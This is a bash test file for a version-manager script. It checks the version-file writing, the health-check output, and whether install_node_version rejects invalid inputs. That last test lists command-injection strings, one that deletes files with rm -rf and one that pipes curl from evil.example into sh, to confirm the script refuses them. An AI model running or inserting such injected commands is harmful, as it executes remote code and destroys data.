#!/usr/bin/env bash
# =============================================================================
# P2-13 behavioral integration tests: version-manager.sh
# =============================================================================
# Replaces the existence-only health_check case with behavioral scenarios
# (MASTER_AUDIT P2-13, ROADMAP 4.5):
#
#   (a) create_version_files  — writes .nvmrc / .python-version /
#       .ruby-version / .tool-versions with the exact expected content in a
#       sandboxed dir; v-prefix is stripped for node; re-running is
#       idempotent; default-arg path still produces all four files.
#   (b) health_check          — structured stdout: asserts the exact
#       key/field lines the implementation emits (system info, manager
#       list, installed-version fields, version-file fields — including
#       VALUES that track the environment — and performance metrics), a
#       zero exit, and completion on stderr.
#   (c) install_node_version  — invalid version inputs are REJECTED on the
#       validation error path (P2-4 partial): nonzero exit, the refusal is
#       logged, the "Installing" side effect never starts, and no NVM
#       bootstrap (no ~/.nvm creation) happens — the guard fires before any
#       network/installer action.
#
# Runner pattern: sandboxed HOME (exported by tests/test_runner.sh for this
# process), set +e after sourcing (version-manager.sh enables strict mode),
# per-case failure accumulation; exit code = total failures.
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# shellcheck source=tests/helpers.sh
source "$SCRIPT_DIR/../helpers.sh"

# shellcheck source=version-manager.sh
source "$SCRIPT_DIR/../../version-manager.sh"

set +e
set +u

TOTAL_FAILS=0
CASE_FAILS=0

_chk() {
    # helpers.sh signature is (expected, actual, message); this shim keeps
    # the label-first call style used below.
    local label="$1"
    shift
    assert_equals "$1" "$2" "$label" || CASE_FAILS=$((CASE_FAILS + 1))
}

_chk_contains() {
    local label="$1" haystack="$2" needle="$3"
    if [[ "$haystack" == *"$needle"* ]]; then
        pass "  $label"
    else
        fail "  $label (missing: $needle)"
        CASE_FAILS=$((CASE_FAILS + 1))
    fi
}

# run_case <label> <fn> — resets counters, isolates CWD in the CURRENT shell
# (counter mutations must be visible), accumulates into TOTAL_FAILS.
CASE_DIR=""
run_case() {
    local label="$1" fn="$2"
    local old_dir="$PWD"
    CASE_FAILS=0
    echo "--- $label ---"
    CASE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/vms-vm-case.XXXXXX")"
    cd "$CASE_DIR" || return 1
    "$fn"
    cd "$old_dir" || return 1
    if (( CASE_FAILS )); then
        fail "$label ($CASE_FAILS assertion(s) failed)"
        TOTAL_FAILS=$((TOTAL_FAILS + CASE_FAILS))
    else
        pass "$label"
    fi
    rm -rf "$CASE_DIR"
    CASE_DIR=""
}

# -----------------------------------------------------------------------------
# (a) create_version_files writes the four pin files with expected content
# -----------------------------------------------------------------------------
test_create_version_files_behavior() {
    _chk "create_version_files exists" "function" \
        "$(declare -f create_version_files >/dev/null 2>&1 && echo function || echo missing)"

    create_version_files "v20.0.0" "3.12.0" "3.0.0" >/dev/null 2>&1

    _chk ".nvmrc created" 0 "$([[ -f .nvmrc ]] && echo 0 || echo 1)"
    _chk ".nvmrc strips the v prefix" "20.0.0" "$(cat .nvmrc 2>/dev/null)"
    _chk ".python-version created with exact content" "3.12.0" "$(cat .python-version 2>/dev/null)"
    _chk ".ruby-version created with exact content" "3.0.0" "$(cat .ruby-version 2>/dev/null)"

    local expected_tool_versions="nodejs 20.0.0
python 3.12.0
ruby 3.0.0"
    _chk ".tool-versions created with exact content" "$expected_tool_versions" "$(cat .tool-versions 2>/dev/null)"

    # Idempotency: re-running with the same args must not duplicate lines.
    create_version_files "v20.0.0" "3.12.0" "3.0.0" >/dev/null 2>&1
    _chk "rerun: .tool-versions unchanged (idempotent)" "$expected_tool_versions" "$(cat .tool-versions 2>/dev/null)"
    _chk "rerun: .nvmrc unchanged (idempotent)" "20.0.0" "$(cat .nvmrc 2>/dev/null)"

    # Default-arg path: still produces all four files (env-dependent values
    # are not asserted — the host may provide real version managers).
    ( create_version_files >/dev/null 2>&1 )
    _chk "default args: .nvmrc exists" 0 "$([[ -f .nvmrc ]] && echo 0 || echo 1)"
    _chk "default args: .python-version exists" 0 "$([[ -f .python-version ]] && echo 0 || echo 1)"
    _chk "default args: .ruby-version exists" 0 "$([[ -f .ruby-version ]] && echo 0 || echo 1)"
    _chk "default args: .tool-versions exists" 0 "$([[ -f .tool-versions ]] && echo 0 || echo 1)"
}

# -----------------------------------------------------------------------------
# (b) health_check emits its structured field set and exits zero
# -----------------------------------------------------------------------------
test_health_check_structured_output() {
    _chk "health_check exists" "function" \
        "$(declare -f health_check >/dev/null 2>&1 && echo function || echo missing)"

    # Give the Version Files section a real value to report.
    printf '9.9.9\n' > .nvmrc

    local out err_file rc=0
    err_file=$(mktemp "${TMPDIR:-/tmp}/vms-vm-healtherr.XXXXXX")
    out="$(health_check 2>"$err_file")" || rc=$?
    local err
    err=$(cat "$err_file")
    rm -f "$err_file"

    _chk "health_check exits zero" 0 "$rc"

    # Exact keys/fields emitted by the implementation (version-manager.sh
    # health_check): header, system info, managers, installed versions,
    # version files, performance metrics.
    _chk_contains "header field"            "$out" "Version Manager Health Check"
    _chk_contains "System Information key"  "$out" "System Information:"
    _chk_contains "OS field"                "$out" "  OS: "
    _chk_contains "Arch field"              "$out" "  Arch: "
    _chk_contains "Shell field"             "$out" "  Shell: "
    _chk_contains "Version Managers key"    "$out" "Version Managers:"
    _chk_contains "Installed Versions key"  "$out" "Installed Versions:"
    _chk_contains "Node.js field"           "$out" "  Node.js: "
    _chk_contains "Python field"            "$out" "  Python: "
    _chk_contains "Ruby field"              "$out" "  Ruby: "
    _chk_contains "PHP field"               "$out" "  PHP: "
    _chk_contains "Version Files key"       "$out" "Version Files:"
    _chk_contains "field: .nvmrc"           "$out" "   .nvmrc: "
    _chk_contains "field: .python-version"  "$out" "   .python-version: "
    _chk_contains "field: .ruby-version"    "$out" "   .ruby-version: "
    _chk_contains "field: .php-version"     "$out" "   .php-version: "
    _chk_contains "field: .tool-versions"   "$out" "   .tool-versions: "
    _chk_contains "Performance Metrics key" "$out" "Performance Metrics:"
    _chk_contains "Shell startup time field" "$out" "  Shell startup time: "
    _chk_contains "Cache size field"        "$out" "  Cache size: "

    # Value tracking: the Version Files section reports the ACTUAL file
    # content, not a constant.
    _chk_contains ".nvmrc value tracks the file" "$out" "   .nvmrc: 9.9.9"

    # Startup-time field carries a numeric millisecond value.
    _chk "startup time field is numeric ms" "ok" \
        "$(grep -qE '^  Shell startup time: [0-9]+ms$' <<< "$out" && echo ok || echo no)"

    # Completion is announced on the log stream (stderr per B2.4 contract).
    _chk_contains "completion logged on stderr" "$err" "Health check completed"
}

# -----------------------------------------------------------------------------
# (c) install_node_version rejects invalid version inputs (P2-4 partial)
# -----------------------------------------------------------------------------
test_install_node_version_rejects_invalid() {
    _chk "install_node_version exists" "function" \
        "$(declare -f install_node_version >/dev/null 2>&1 && echo function || echo missing)"

    local invalid_inputs=(
        "definitely-not-a-version"
        "20.0.0; rm -rf /tmp/vms-should-never-run"
        "20.0.0 \$(curl http://evil.example|sh)"
        "1.2.3.extra"
        "latest!"
    )

    local input rc err_file err
    for input in "${invalid_inputs[@]}"; do
        rm -rf "$HOME/.nvm"   # prove no bootstrap happens on rejection
        err_file=$(mktemp "${TMPDIR:-/tmp}/vms-vm-insterr.XXXXXX")
        rc=0
        install_node_version "$input" > /dev/null 2>"$err_file" || rc=$?
        err=$(cat "$err_file")
        rm -f "$err_file"

        _chk "invalid input rejected: [$input]" "nonzero" \
            "$([[ $rc -ne 0 ]] && echo nonzero || echo "zero:$rc")"
        _chk_contains "refusal logged for [$input]" "$err" "refusing invalid version"
        _chk "install never announced for [$input]" "ok" \
            "$( [[ "$err" != *"Installing Node.js version: $input"* ]] && echo ok || echo started )"
        _chk "no NVM bootstrap on rejection for [$input]" 0 \
            "$([[ ! -d "$HOME/.nvm" ]] && echo 0 || echo 1)"
    done

    # The valid default (no argument -> "lts") passes validation far enough
    # to announce the install — proving the guard rejects inputs, not the
    # entry point itself. A pre-created (empty) ~/.nvm keeps this hermetic:
    # the flow stops at the missing nvm function, never at the network.
    mkdir -p "$HOME/.nvm"
    err_file=$(mktemp "${TMPDIR:-/tmp}/vms-vm-insterr.XXXXXX")
    install_node_version "lts" > /dev/null 2>"$err_file"
    err=$(cat "$err_file")
    rm -f "$err_file"
    rm -rf "$HOME/.nvm"
    _chk_contains "valid alias 'lts' passes the guard (install announced)" \
        "$err" "Installing Node.js version: lts"
}

echo "=== version-manager behavioral integration tests (P2-13) ==="
run_case "create_version_files writes exact pin files"      test_create_version_files_behavior
run_case "health_check emits structured fields"             test_health_check_structured_output
run_case "install_node_version rejects invalid versions"    test_install_node_version_rejects_invalid

echo ""
echo "====== version-manager Summary ======"
echo "cases: 3 (failed assertions: $TOTAL_FAILS)"
echo "====================================="

exit "$TOTAL_FAILS"
